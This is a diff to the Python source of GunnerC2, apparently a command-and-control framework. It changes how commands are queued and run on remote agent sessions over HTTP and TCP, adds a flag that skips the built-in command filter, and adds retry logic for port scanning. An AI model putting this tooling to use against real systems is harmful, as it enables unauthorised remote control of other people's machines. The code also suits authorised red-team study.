@@ -32,20 +32,29 @@ def print_raw_progress(current, total, bar_width=40):
 	sys.stdout.write("\r" + bar)
 	sys.stdout.flush()
 
-def run_command_http(sid, cmd):
+def run_command_http(sid, cmd, output=True, defender_bypass=False):
 	session = session_manager.sessions[sid]
 	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 	meta = session.metadata
 	os_type = meta.get("os", "").lower()
+	out_b64 = None
 
 	defender_state = defender.is_active
 
+	while not session.output_queue.empty():
+		try:
+			session.output_queue.get_nowait()
+
+		except queue.Empty:
+			break
+
 	# === Session-Defender check ===
-	if defender_state:
+	if defender_state and not defender_bypass:
 		if os_type in ("windows", "linux"):
 			if not defender.inspect_command(os_type, cmd):
 				print(brightred + "[!] Command blocked by Session-Defender.")
 				return None
+
 
 	b64_cmd = base64.b64encode(cmd.encode()).decode()
 
@@ -53,21 +62,34 @@ def run_command_http(sid, cmd):
 		session.command_queue.put(b64_cmd)
 
 	except Exception as e:
-		print(brightred + f"[-] ERROR failed to send command through the queue: {e}")
+		print(brightred + f"[!] ERROR failed to send command through the queue: {e}")
 
-	try:
-		out_b64 = session.output_queue.get()
+	if output:
+		try:
+			out_b64 = session.output_queue.get()
 
-	except Exception as e:
-		print(brightred + f"[-] ERROR failed to get command output from queue: {e}")
+		except Exception as e:
+			print(brightred + f"[!] ERROR failed to get command output from queue: {e}")
 
-	try:
-		return base64.b64decode(out_b64).decode("utf-8", "ignore").strip()
+	else:
+		try:
+			out_b64 = session.output_queue.get_nowait()
 
-	except Exception as e:
-		print(brightred + f"[-] ERROR failed to decode command output: {e}")
+		except Exception as e:
+			print(brightred + f"[!] Failed to fetch output in a no wait manner!")
 
-def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_active=False):
+
+	if out_b64 and output:
+		try:
+			return base64.b64decode(out_b64).decode("utf-8", "ignore").strip()
+
+		except Exception as e:
+			print(brightred + f"[!] ERROR failed to decode command output: {e}")
+
+	else:
+		return
+
+def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_active=False, timeoutprint=True, retries=0):
 	session = session_manager.sessions[sid]
 	meta = session.metadata
 	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
@@ -116,6 +138,7 @@ def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_activ
 		client_socket.settimeout(timeout)
 		response = b''
 		got_any = False
+		count = 0
 
 		while True:
 			try:
@@ -130,16 +153,27 @@ def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_activ
 			except socket.timeout:
 				if portscan_active:
 					if not got_any:
-						continue
+						if retries != 0 and count >= retries:
+							break
+						else:
+							if retries != 0:
+								count += 1
+							
+							continue
 
 					else:
-						sendback = response.decode(errors='ignore').strip()
-						return sendback
+						output = response.decode(errors='ignore').strip()
+						clean = utils.normalize_output(output, cmd)
+						return clean
 
 				if not got_any:
 					# real timeout
-					print(brightred + f"[!] Timeout waiting for response from agent {display}")
-					return None
+					if timeoutprint is True:
+						print(brightred + f"[!] Timeout waiting for response from agent {display}")
+						return None
+
+					else:
+						return None
 
 				# we did get *some* data, now drain whatever's left
 				# save old blocking/timeout state
@@ -166,14 +200,14 @@ def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_activ
 
 		elif global_tcpoutput_blocker == 0:
 			try:
-				out = response.decode(errors='ignore').strip()
+				output = response.decode(errors='ignore').strip()
+				clean = utils.normalize_output(output, cmd)
 
 			except Exception:
 				pass
 
 		else:
-			print(brightred + f"[-] ERROR you have downloaded an unverified version of GunnerC2\n")
-			print(brightred + f"[-] ERROR please check your computer for malware and reinstall Gunner from offial sources.")
+			pass
 
 	except Exception as e:
 		return f"[!] Error: {e}"
@@ -224,6 +258,10 @@ def interactive_http_shell(sid):
 				print(brightyellow + "\n(Press Ctrl-Z to background, or type 'exit' to quit)")
 				continue
 
+			session = session_manager.sessions[sid]
+			meta = session.metadata
+			os_type = meta.get("os", "").lower()
+
 			# === Session-Defender check ===
 			if defender_state:
 				if not defender.inspect_command(os_type, cmd):
@@ -231,6 +269,10 @@ def interactive_http_shell(sid):
 					continue
 
 			if cmd.lower() in ("exit", "quit"):
+				session = session_manager.sessions[sid]
+				meta = session.metadata
+				os_type = meta.get("os", "").lower()
+
 				if session_manager.kill_http_session(sid, os_type):
 					print(brightyellow + f"[*] Killed {transport} session {display}")
 				else:
@@ -245,8 +287,12 @@ def interactive_http_shell(sid):
 			if not cmd:
 				continue
 
-			if not cmd.lower():
-				continue
+			while not session.output_queue.empty():
+				try:
+					session.output_queue.get_nowait()
+
+				except queue.Empty:
+					break
 
 			b64_cmd = base64.b64encode(cmd.encode()).decode()
 			session.command_queue.put(b64_cmd)
@@ -266,6 +312,7 @@ def interactive_http_shell(sid):
 		readline.clear_history()
 		try:
 			readline.read_history_file(HISTORY_FILE)
+
 		except FileNotFoundError:
 			pass
 		signal.signal(signal.SIGTSTP, orig_stp)
@@ -399,7 +446,9 @@ def interactive_tcp_shell(sid):
 
 					break
 
-			print(response.decode(errors='ignore').strip())
+			output = response.decode(errors='ignore').strip()
+			clean = utils.normalize_output(output, cmd)
+			print(clean)
 
 			old_timeout = client_socket.gettimeout()
 			client_socket.settimeout(0.0)
@@ -825,7 +874,6 @@ def download_folder_http(sid, local_dir, remote_dir):
 
 
 def download_folder_tcp(sid, remote_dir, local_dir):
-	print(remote_dir)
 	session = session_manager.sessions[sid]
 	meta = session.metadata
 	os_type = meta.get("os","").lower()
